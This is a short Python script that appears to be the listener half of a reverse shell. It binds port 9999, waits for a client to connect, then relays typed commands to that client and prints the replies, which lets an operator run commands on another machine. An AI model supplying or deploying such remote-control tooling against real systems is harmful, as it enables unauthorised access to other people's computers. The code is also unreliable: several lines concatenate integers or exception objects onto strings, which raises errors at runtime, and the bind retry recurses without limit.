import socket
import sys


# Create socket (allows two computers to connect)
def socket_create():
    try:
        global host
        global port
        global s
        host = ''
        port = 9999
        s = socket.socket()
    except socket.error as msg:
        print("Socket creation error: " + str(msg))


# Bind a socket to the port and waiting connection from client
def socket_bind():
    try:
        global host
        global port
        global s
        print("Binding socket to the port: " + port)
        s.bind((host, port))
        s.listen(5)
    except socket.error as msg:
        print("Socket binding error: " + msg + "\n" + "Retrying...")
        socket_bind()


# Establish the connection to the client
def socket_accpt():
    conn, adress = s.accept()
    print("Connection has been established | IP " + adress[0] + " | Port " + adress[1])
    send_command(conn)
    conn.close()


# Send command
def send_command(conn):
    while True:
        cmd = input()
        if cmd == 'quit':
            conn.close()
            s.close()
            sys.exit()
        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(1024), "utf-8")
            print(client_response, end="")


def main():
    socket_create()
    socket_bind()
    socket_accpt()


main()
